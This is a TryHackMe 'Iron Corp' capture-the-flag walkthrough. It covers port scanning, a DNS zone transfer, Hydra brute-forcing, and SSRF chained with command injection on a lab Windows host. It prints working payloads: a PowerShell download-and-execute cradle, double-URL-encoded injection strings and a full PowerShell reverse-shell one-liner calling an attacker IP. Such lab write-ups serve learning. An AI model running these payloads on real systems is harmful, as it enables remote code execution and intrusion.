<h1 align="center">Iron Corp</h1>
<p align="center">2025, September 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>460</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Can you get access to Iron Corp's system?</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/3ca6aff2-34c6-43ea-89e8-01a22a793524"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/ironcorp">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b7cf893f-e0ad-4b8e-9f53-46b54516f860"></p>

<br>

<p align="center">Practice <code>nmap</code>, <code>rustscan</code>, <code>dirb</code>, <code>dig</code>, <code>Burp Suite</code>,  <code>Hydra</code></p>

<br>

<h1 align="center">Task 1 . Iron Corp</h1>
<p align="center">Iron Corp suffered a security breach not long time ago.<br>

You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.<br>

The asset in scope is: ironcorp.me<br>

Note: Edit your config file and add ironcorp.me<br>

Note 2: <em>It might take around 5-7 minutes for the VM to fully boot, so please be patient</em>.<br>

Happy hacking!</p>

<p><em>Answer the questions below</em></p>

<p>1.1. user.txt<br>
<code>_____</code></p>

<br>

<p>1.2. root.txt<br>
<code>_____</code></p>
<br>
<br>

<h1 align="center">Reconnaissance</h1>
<br>
<h3 align="center">/etc/hosts</h3>
<p  align="center">ironcorp.me</p>

```bash
TargetIP     ironcorp.me
```

<br>
<h3 align="center">nmap</h3>
<p  align="center"><code>&nbsp;&nbsp;&nbsp;53</code> :  &nbsp;&nbsp;&nbsp;DNS<br><code>&nbsp;&nbsp;&nbsp;135</code> : &nbsp;&nbsp;&nbsp;RPC<br>&nbsp;<code>3389</code> :  &nbsp;&nbsp;&nbsp;RDP<br><code>&nbsp;&nbsp;8080</code> : &nbsp;&nbsp;&nbsp;HTTP<br><code>11025</code> : &nbsp;&nbsp;&nbsp;HTTP<br><code>49667</code> : &nbsp;&nbsp;&nbsp;RPC<br><code>49670</code> : &nbsp;&nbsp;&nbsp;RPC</p>

```bash
:~/IronCorp# nmap -p- -vv ironcorp.me
...
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 128
135/tcp   open  msrpc         syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
11025/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
```

<br>

```bash
:~/IronCorp# nmap -sS -Pn -p- ironcorp.me
...
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
```

<br>

```bash
:~/IronCorp# rustscan -a xx.xxx.xx.xxx --ulimit 5500 -b 65535 -- -A -Pn
...
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-xx-xxTxx:xx:xx+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-xx-xxTxx:xx:xx
| Not valid after:  2026-xx-xxTxx:xx:xx
| MD5:   9278 1461 c030 09f6 3d60 0acd 12e5 d20a
| SHA-1: 56dc 8460 f7cf 4a05 fe76 7c81 3ba1 2e21 3eda 2b85
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQWRcbnyVb4ZVHx7fpg2OI/DANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjUwNzMxMDA0ODQzWhcNMjYw
...
| eqDo7JphpRmrTFVMEevsUfG4CIQFesyvPxtC0OSiSnC7c38isAuokbAAB/wvfXMv
| DhIOctQDwqctVRPklaMvpydWlkMnOQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

<br>
<h3 align="center">dirb</h3>
<p align="center">xx.xxx.xx.xxx:<strong>8080</strong><br>

### 🗂️ Valuable Paths to Explore

| **Path**                                                                 | **Why It's Valuable**                                                                 |
|--------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `/index.html`                                                            | Main page — may contain links, comments, or hints.                                    |
| `/assets/js/`                                                            | JavaScript files often reveal hidden endpoints or logic flaws.                        |
| `/assets/plugins/`                                                      | May include third-party libraries with known vulnerabilities.                         |
| `/assets/images/gallery/` and `/assets/Images/gallery/`                 | Potential for steganography or metadata clues in images.                              |
| `/assets/images/timeline/` and `/assets/Images/timeline/`               | Could contain historical or event-related files with embedded flags.                  |
| `/assets/css/`                                                           | Sometimes includes commented-out code or references to hidden pages.                  |

### 🧊 Optional Paths (Lower Priority)

| **Path**                                                                 | **Notes**                                                                              |
|--------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `/assets/fonts/`                                                         | Typically decorative, but worth checking for anomalies.                               |
| `/assets/flags/1x1/`                                                     | Likely visual assets, but inspect for unusual naming or hidden data.                  |
| `/assets/images/favicon.ico`                                            | Duplicate in both `/images/` and `/Images/`; check for steganography just in case.    |


```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:8080
...                                                        

---- Scanning URL: http://xx.xxx.xx.xxx:8080/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/                                                                                                                                                                                           
+ http://xx.xxx.xx.xxx:8080/index.html (CODE:200|SIZE:20040)                                                                                                                                                                               
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/css/                                                                                                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/fonts/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/js/                                                                                                                                                                                        
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/plugins/                                                                                                                                                                                   
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/css/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/                                                                                                                                                                                 
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/fonts/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/Images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/js/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/plugins/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/timeline/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/ ----
                                                                                                                                                                                                                                           
-----------------
```

<br>
<p align="center">xx.xxx.xx.xxx:<strong>11025</strong><br>
 
- /aux<br>
- /cgi-bin/<br>
- /com1<br>
- /com2<br>
- /com3<br>
- /con<br>
- /css/<br>
- /img/<br>
- /examples<br>
- /index.html<br>
- /js/<br>
- /license<br>
- /LICENSE<br>
- /licenses<br>
- /lpt1<br>
- /lpt2<br>
- /nul<br>
- /phpmyadmin<br>
- /prn<br>
- /server-info<br>
- /server-status<br>
- /vendor/<br>
- /webalizer</p>

```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:11025
...
---- Scanning URL: http://xx.xxx.xx.xxx:11025/ ----
+ http://xx.xxx.xx.xxx:11025/aux (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/cgi-bin/ (CODE:403|SIZE:1061)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/com1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com3 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/con (CODE:403|SIZE:1047)                                                                                                              
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/css/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/examples (CODE:503|SIZE:1061)                                                                                                         
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/img/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/index.html (CODE:200|SIZE:2739)                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/js/                                                                                                                      
+ http://xx.xxx.xx.xxx:11025/license (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/LICENSE (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/licenses (CODE:403|SIZE:1206)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/lpt1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/lpt2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/nul (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/phpmyadmin (CODE:403|SIZE:1047)                                                                                                       
+ http://xx.xxx.xx.xxx:11025/prn (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/server-info (CODE:403|SIZE:1206)                                                                                                      
+ http://xx.xxx.xx.xxx:11025/server-status (CODE:403|SIZE:1206)                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/vendor/                                                                                                                  
+ http://xx.xxx.xx.xxx:11025/webalizer (CODE:403|SIZE:1047)                                                                                                        
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
```

<br>
<h3 align="center">dig</h3>
<p align="center">xx.xxx.xx.xxx:<strong>8080</strong><br>
<strong>ironcorp.me</strong> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp; <strong>admin.ironcorp.me</strong> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp;<strong>internal.ironcorp.me</strong></p>

```bash
:~/IronCorp# dig axfr ironcorp.me @xx.xxx.xx.xxx

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr ironcorp.me @TargetIP
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 480 msec
;; SERVER:TargetIP#53(TargetIP) (TCP)
;; WHEN: Fri Aug 01 03:53:39 BST 2025
;; XFR size: 5 records (messages 1, bytes 238)
```

<br>
<h3 align="center">/etc/hosts</h3>
<p  align="center"><strong>ironcorp.me</strong> &nbsp; &nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp; <strong>admin.ironcorp.me</strong> &nbsp; &nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp;<strong>internal.ironcorp.me</strong></p>

```bash
xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
```

<h3 align="center">Web</h3>

<p>

- ironcorp.me:8080<br>
----- <code>Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent</code><br>
- internal.ironcorp.me:8080<br>
----- <code>Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent</code><br>
----- <code>/assets/js/pace.min.js</code> : 200<br>
----- <code>/assets/plugins/vectormap/jquery-jvectormap-2.0.2.css</code> : 400<br>
----- <code>/110x110</code> -<br>
----- <code>/assets/js/jquery.min.js</code> 200<br>
----- <code>/assets/plugins/simplebar/js/simplebar.js</code> : 200<br>
----- <code>/assets/js/bootstrap.min.js</code> : 200<br>
----- <code>/assets/js/popper.min.js</code> : 200<br>
----- <code>assets/js/sidebar-menu.js</code> : 200<br>
----- <code>/assets/js/jquery.loading-indicator.js</code> : 404<br>
----- <code>/assets/js/app-script.js</code> : 200<br>
----- <code>/assets/plugins/Chart.js/Chart.min.js</code> : 200<br>
----- <code> /assets/js/index.js</code> : 200<br>
- admin.ironcorp.me:11025 --> Authentication required!<br>
----- Authorization: Basic <code>YWRtaW46YWRtaW4=</code> = <code>admin</code> : <code>admin</code> == Authentication required!<br>
----- Authorization: Basic <code>YWRtaW46cGFzc3dvcmQxMjM=</code> = <code>admin</code> : <code>password123</code> == Hello<br>
---------- Response = <code>method="GET"</code>, <code>action="#"</code>, <code>name="r"</code>, <code>type="submit"</code><br>
---------- Search = <code>ls</code> = 200 OK = <code>/?r=ls#</code></p>


<p align="center">ironcorp.me:8080  |  admin.ironcorp.me:8080   |   internal.ironcorp.me:8080</p>

<img width="1126" height="716" alt="image" src="https://github.com/user-attachments/assets/f85ee496-57c0-4e3e-b1d8-77c9613c3dc1" />

<br>
<br>
<p  align="center">admin.ironcorp.me:11025</p>

<img width="1134" height="716" alt="image" src="https://github.com/user-attachments/assets/fd1b1996-a020-4c34-9190-6589b44f9e86" />

<br>
<br>

<p  align="center">admin.ironcorp.me:11025</p>

<img width="1127" height="680" alt="image" src="https://github.com/user-attachments/assets/805b1a3a-f6f2-444b-b08c-7eaff6955d20" />

<br>
<br>
<h1 align="center">Command & Control (C2)</h1>

<br>
<p  align="center">Search = <code>internal.ironcorp.me:8080</code></p>

<img width="1130" height="671" alt="image" src="https://github.com/user-attachments/assets/b4f5eb98-454c-472f-bf4a-fa24fc4b34f5" />

<br>
<p align="center">Search = <code>internal.ironcorp.me:11025</code></p>

<img width="1129" height="202" alt="image" src="https://github.com/user-attachments/assets/820f7a68-76bb-45c2-a6b9-f4aa6cf3167a" />

<br>
<br>

<img width="966" height="243" alt="image" src="https://github.com/user-attachments/assets/060e069b-f1c9-491f-ad0c-0864b2baa3fd" />

<br>
<br>

<img width="1129" height="325" alt="image" src="https://github.com/user-attachments/assets/52facf0a-9ba8-4576-96fc-37caa817e1ca" />

<br>
<br>
<p align="center">internal.ironcorp.me:11025/name.php?name=</p>


<img width="678" height="231" alt="image" src="https://github.com/user-attachments/assets/141cfcae-1816-4f1c-83c7-ad01b8137582" />

<br>
<br>

<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi</p>

<img width="1245" height="340" alt="image" src="https://github.com/user-attachments/assets/2a30456e-3b84-4a54-a88f-8717b2c96d9d" />

<br>
<br>

<img width="1220" height="278" alt="image" src="https://github.com/user-attachments/assets/076d2762-3b84-46c9-9c15-94dec7d8b43b" />

<br>
<br>

<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami</p>

<img width="1214" height="248" alt="image" src="https://github.com/user-attachments/assets/9fe97888-e6ca-4e22-91ac-269ac63e1c86" />

<br>
<br>

```bash
:~/IronCorp# git clone https://github.com/samratashok/nishang.git
```

```bash
:~/IronCorp# cd nishang
```

```bash
~/IronCorp/nishang# ls
ActiveDirectory  Bypass         DISCLAIMER.txt  Gather   MITM          powerpreter  Scan
Antak-WebShell   CHANGELOG.txt  Escalation      LICENSE  nishang.psm1  Prasadhak    Shells
Backdoors        Client         Execution       Misc     Pivot         README.md    Utility
```

```bash
:~/IronCorp/nishang# cd Shells
```

```bash
:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
```

<br>

```bash
:~/IronCorp/nishang/Shells# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<h3 align="center">ironcorp.me:8080/login.html</h3>

<img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/d828e3b1-9a44-44e0-9a56-9b00096c7ca1" />

<br>
<br>

<h3 align="center">ironcorp.me:11025</h3>

<img width="1062" height="351" alt="image" src="https://github.com/user-attachments/assets/15487d11-affb-4284-a147-0a8074d3b687" />

<br>
<br>

<img width="1062" height="320" alt="image" src="https://github.com/user-attachments/assets/85872486-4a9a-4337-8340-21d9369b4a2c" />

<br>
<br>

<img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />


<h3 align="center">Hydra</h3>
<p align= "center">admin: password123</p>

```bash
:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
```

<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />

<br>
<br>

<img width="1200" height="636" alt="image" src="https://github.com/user-attachments/assets/c395a147-5819-4c0d-95a5-106719691c5e" />

<br>
<br>

<img width="1195" height="505" alt="image" src="https://github.com/user-attachments/assets/ce5bcf6d-4983-443a-8521-9fad53161fc0" />

<br>
<br>

<h3 align="center">Burp Suite, Repeater</h3>

<img width="1191" height="209" alt="image" src="https://github.com/user-attachments/assets/4ff48264-3d11-4720-9f66-bf45151a2b37" />

<br>
<br>

<img width="1188" height="382" alt="image" src="https://github.com/user-attachments/assets/30bbb507-dd18-4fd7-b735-fcd74cc907bc" />

<br>
<br>

<img width="1171" height="629" alt="image" src="https://github.com/user-attachments/assets/5eff7c69-215d-434a-9611-06ddc20ad92c" />

<br>
<br>

<h3 align="center">http server</h3>

```bash
:~/IronCorp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.90.153%3A8000%2FInvoke-PowerShellTcp.ps1#
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|whoami
```


```bash
http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-object system.net.webclient).downloadstring('http://10.201.90.153:8000/Invoke-PowerShellTcp.ps1'/
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%35%25%37%38%25%36%35%25%36%33%25%32%30%25%36%32%25%37%39%25%37%30%25%36%31%25%37%33%25%37%33%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%32%38%25%34%65%25%36%35%25%37%37%25%32%64%25%34%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%36%35%25%37%34%25%32%65%25%35%37%25%36%35%25%36%32%25%34%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%35%30%25%37%32%25%36%66%25%37%38%25%37%39%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%64%25%35%62%25%34%65%25%36%35%25%37%34%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%35%64%25%33%61%25%33%61%25%34%34%25%36%35%25%36%36%25%36%31%25%37%35%25%36%63%25%37%34%25%34%65%25%36%35%25%37%34%25%37%37%25%36%66%25%37%32%25%36%62%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%62%25%36%39%25%37%37%25%37%32%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%39%25%33%30%25%32%65%25%33%31%25%33%35%25%33%33%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%37%63%25%36%39%25%36%35%25%37%38%25%32%32
```


```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|Invoke-PowerShellTcp.ps1
```

<img width="961" height="73" alt="image" src="https://github.com/user-attachments/assets/2a2db5bd-f7d7-4605-9d3c-984e81ded5d2" />

<br>
<br>

<img width="1129" height="505" alt="image" src="https://github.com/user-attachments/assets/412250fc-e92a-4dcd-8d4b-500657ec7dfe" />

<br>
<br>

```bash
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.28.78/Invoke-PowerShellTcp.ps1')
```

```bash
http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%32%25%33%38%25%32%65%25%33%37%25%33%38%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
```

```bash
/?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
```

<h3 align="center">Invoke-Powershell</h3>

<img width="862" height="313" alt="image" src="https://github.com/user-attachments/assets/a5ed30ba-3a31-4fcb-85cf-23f04bee0d3c" />

<br>
<br>



```bash
:~/IronCorp/nishang/Shells# nano Invoke-PowerShellTcp.ps1
```

```bash
:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

<img width="1193" height="356" alt="image" src="https://github.com/user-attachments/assets/10c21602-5c84-49da-aafe-f70865d92a02" />

<br>
<br>

```bash
:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
